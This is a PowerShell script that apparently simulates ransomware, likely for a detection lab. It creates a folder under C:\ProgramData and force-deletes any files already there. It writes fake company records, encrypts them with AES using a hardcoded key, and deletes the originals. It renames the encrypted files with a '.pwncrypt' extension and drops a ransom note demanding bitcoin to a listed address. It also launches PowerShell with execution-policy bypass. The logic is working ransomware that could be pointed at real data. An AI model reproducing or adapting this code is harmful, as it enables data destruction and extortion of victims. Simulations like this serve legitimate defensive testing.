 # Define the Public Desktop path and new Documents folder path
# $publicDesktop = "C:\Users\Public\Desktop"
$documentsFolder = "C:\ProgramData\Docs" # "C:\Documents"

# Create the Documents folder if it doesn't exist
if (-not (Test-Path -Path $documentsFolder)) {
    New-Item -Path $documentsFolder -ItemType Directory
}

# Clear the Documents folder if it already contains files
Get-ChildItem -Path $documentsFolder -File | ForEach-Object {
    Remove-Item $_.FullName -Force
}

# Define encryption key and IV (Initialization Vector) for AES
$key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
$iv = [byte[]](1..16) # IV should be 16 bytes for AES

# Function to encrypt text using AES
function Encrypt-Text($plainText, $key, $iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

    $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)

    $aes.Dispose()
    return $encryptedBytes
}

# Fake company information (You can adjust these as needed)
$fakeFiles = @{
    "EmployeeRecords.txt" = "Johnathan Maxwell Doe, Full Legal Name: Johnathan Maxwell Doe III, Employee ID: 12345, Role: Senior Manager of Global Operations and Strategic Development`nDate of Hire: July 23, 2009`nDepartment: Strategic Development Division – responsible for formulating and executing the company’s long-term business strategies across multiple continents including North America, Europe, and Asia.`nPosition Responsibilities: Johnathan is tasked with overseeing cross-continental mergers, acquisitions, and partnerships, as well as ensuring that all international business operations adhere to the stringent regulatory frameworks imposed by various global governments and trade organizations. He has led multiple high-profile acquisitions, including the merger with TriCo Technologies, a key competitor, which resulted in a 22% market share growth for the company in 2023. In addition to these duties, Johnathan spearheads new initiatives in green energy solutions for the company, leading the R&D and deployment of solar-powered manufacturing plants across three regions.`nKey Projects: Global acquisition of key competitor TriCo Technologies (2023); spearheading the development of a new eco-friendly manufacturing division (2022-2024); implementation of a blockchain-based logistics system to track and reduce supply chain costs.`nPerformance Reviews: Johnathan’s leadership was described as 'transformative' during his last performance review, citing his strategic vision and his ability to execute complex global projects as his standout qualities. His division has outperformed all other segments, delivering a consistent 15% revenue growth annually.`nAwards: Company Executive of the Year (2021); Best Innovation in Green Technology (2023)`nCompensation: $450,000 annual salary + 30% bonuses tied to performance metrics.`nNotes: Known for his excellent negotiation skills and long-term vision for sustainable growth.`n-----`nJane Eloise Smith, Full Legal Name: Jane Eloise Smith, Employee ID: 54321, Lead Software Engineer in the company’s flagship Artificial Intelligence Division`nEmployee since March 11, 2015`nPosition Overview: Jane leads the machine learning and AI initiatives in the company’s R&D department, overseeing a team of 25 engineers working on cutting-edge algorithms to enhance predictive analytics tools used across the company’s business divisions. Her research focuses on large-scale data processing, neural networks, and the development of proprietary AI models that have been integrated into the company’s core services, providing predictive insights into consumer behavior, market trends, and production optimizations.`nKey Contributions: Developed the core predictive model for the AI-driven analytics platform deployed globally, which contributed to a 12% cost reduction in logistics operations across the company. Additionally, she led the deployment of AI-driven fraud detection systems that helped reduce financial discrepancies by 8% across multiple business lines.`nPublications: Jane is also a published author, having written five papers on neural network optimization and AI ethics in international journals.`nFuture Projects: In 2024, Jane will be leading the 'AI for Good' initiative, which aims to repurpose company technology to aid in global humanitarian efforts, such as disaster recovery and sustainable agriculture systems.`nCompensation: $250,000 base salary, 20% performance bonuses, and stock options.`nNotes: Highly regarded for her ability to balance cutting-edge research with practical business applications. Known for mentoring junior engineers and promoting diversity in tech.";
    "ProjectList.txt" = "Project X - Codename: Odyssey Initiative, Estimated Completion Date: 2024-12-31`nFull Project Scope: This 5-year strategic initiative involves a comprehensive market expansion campaign targeting the Asia-Pacific region. The initiative aims to establish a significant market presence in 15 countries through a multi-faceted approach that includes forging alliances with regional tech companies, deploying innovative digital marketing strategies, and launching region-specific product variations that cater to local tastes and cultural preferences.`nProject Phases: Phase 1 - Market research and analysis (2019-2020); Phase 2 - Partner identification and negotiations (2021-2022); Phase 3 - Product adaptation and pilot program rollouts (2023); Phase 4 - Full market entry and scaling (2024).`nBudget Allocations: A total of $50 million has been earmarked for the project, with the largest portions dedicated to partnerships and market entry strategies ($20 million), product development ($15 million), and marketing campaigns ($10 million).`nRisks: Political instability in target regions (e.g., Southeast Asia), local competitors adapting to international entrants, potential supply chain vulnerabilities.`nExpected Impact: Increase market share by 10% and revenue by $250 million by 2026.`nProject Team: Over 200 staff members across five departments are assigned to the project, with oversight by the Global Expansion Office and support from regional consultants.`n-----`nProject Y - Codename: Apollo Systems Upgrade`nDeadline: October 15, 2024`nProject Scope: This is a company-wide IT infrastructure overhaul aimed at enhancing cybersecurity protocols, migrating legacy systems to a cloud-based architecture, and introducing AI-powered automation tools to streamline data processing.`nProject Phases: Phase 1 – Infrastructure Assessment (2022); Phase 2 – Network Overhaul and Cloud Migration (Q1 2023); Phase 3 – System Integration and Testing (Q2 2023); Phase 4 – Rollout (Q1 2024); Phase 5 – Post-Rollout Monitoring (Q3 2024).`nBudget: $75 million, with allocations for cybersecurity enhancements ($25 million), cloud infrastructure ($30 million), AI integration ($10 million), and system testing and post-implementation adjustments ($10 million).`nRisks: Downtime during cloud migration, potential security vulnerabilities during transition, resistance to adoption from key staff due to training needs.`nExpected Outcome: Reduce operating costs by 20% annually, enhance data security across all sectors, and increase system efficiency by 30%.`nNotes: Key IT staff and external consultants from Microsoft and AWS are involved in the rollout.";
    "CompanyFinancials.txt" = "Fiscal Year 2024 - Full Financial Overview: Total Revenue generated for the fiscal year stands at a record-breaking $150,000,000, which represents a 25% increase compared to the previous year. The Net Profit for the year has been recorded at $18,750,000, indicating a significant rise in operational efficiency and cost management, given that operating expenses only rose by 15% to $75,000,000. This growth has largely been attributed to successful new product launches, particularly in the cloud computing division, as well as aggressive market expansion into new territories such as South America and Southeast Asia.`nDepartmental Performance Breakdown: The Software Solutions department led the charge with a 35% year-on-year growth, contributing $50,000,000 to the overall revenue. The International Sales department followed closely, posting a 25% increase in revenue, bringing in $35,000,000, while the Manufacturing and Logistics segment grew by 20%, adding $40,000,000 to the top line. Conversely, the Domestic Sales department saw slower growth at 10%, due in part to saturation in the North American market.`nKey Investments: Major investments were made in 2024 in both technology and infrastructure, with $20 million allocated to building new data centers in key regions across North America and Europe. Additionally, the company invested $10 million in AI research, particularly focused on developing AI-driven customer support systems, and another $5 million was put towards expanding the logistics network to shorten delivery times in rural areas across the United States.`n-----`nFiscal Year 2023 - Financial Performance: Revenue: $120,000,000; Net Profit: $12,000,000; Operating Expenses: $65,000,000. Top performing departments were the Domestic Sales Division (40% growth) and Cloud Services (32% growth). Key investments included strategic acquisitions in emerging markets and the development of in-house AI tools."
}


# Create fake text files in the Documents folder, encrypt them, then delete the originals
foreach ($file in $fakeFiles.Keys) {
    $filePath = Join-Path $documentsFolder $file

    # Write the fake company information to the text file
    $fakeContent = $fakeFiles[$file]
    & cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command New-Item -Path $filePath -Force -ItemType File
    Set-Content -Path $filePath -Value $fakeContent

    # Encrypt the file content
    $encryptedContent = Encrypt-Text $fakeContent $key $iv

    # Get the current time (Epoch time)
    $epochTime = [int][double]::Parse((Get-Date -UFormat %s))

    # Define the path for the encrypted file with .pwncrypt extension
    $encryptedFilePath = [System.IO.Path]::ChangeExtension($filePath, "$($epochTime).txt.pwncrypt")

    & cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command New-Item -Path $encryptedFilePath -Force -ItemType File
    # Write the encrypted content to the new file
    [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)

    # Delete the original unencrypted file
    Remove-Item -Path $filePath
}

# Write the decryption instructions in the Documents folder
"Your files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`n" | Out-File -FilePath "$($documentsFolder)\decryption-instructions.txt" -Force 
 
